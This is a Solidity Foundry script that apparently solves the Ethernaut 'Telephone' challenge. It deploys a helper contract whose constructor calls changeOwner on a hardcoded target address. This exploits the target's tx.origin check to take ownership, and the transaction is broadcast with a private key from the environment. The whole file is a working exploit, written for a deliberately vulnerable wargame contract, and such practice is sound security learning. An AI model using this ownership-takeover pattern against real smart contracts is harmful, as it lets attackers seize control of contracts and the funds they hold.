// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Telephone.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract ChangeOwner {


    constructor(Telephone _telephone, address _newOwner) {
        _telephone.changeOwner(_newOwner);
       
    }
}

contract TelephoneSolution is Script {

    Telephone public telephoneInstance = Telephone(0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        new ChangeOwner(telephoneInstance, vm.envAddress("ADDRESS"));
        
        vm.stopBroadcast();
    }
}